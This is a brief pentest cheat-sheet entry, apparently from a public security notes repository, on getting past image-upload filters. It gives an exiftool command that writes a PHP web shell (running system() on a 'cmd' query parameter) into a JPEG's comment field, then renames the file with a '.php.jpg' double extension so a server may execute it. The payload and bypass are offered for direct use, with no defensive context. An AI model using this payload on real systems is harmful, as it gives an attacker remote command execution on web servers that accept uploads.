# File-Filter-Busting

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file

mv lo.jpg lo.php.jpg
```
https://github.com/xapax/security/blob/master/bypass_image_upload.md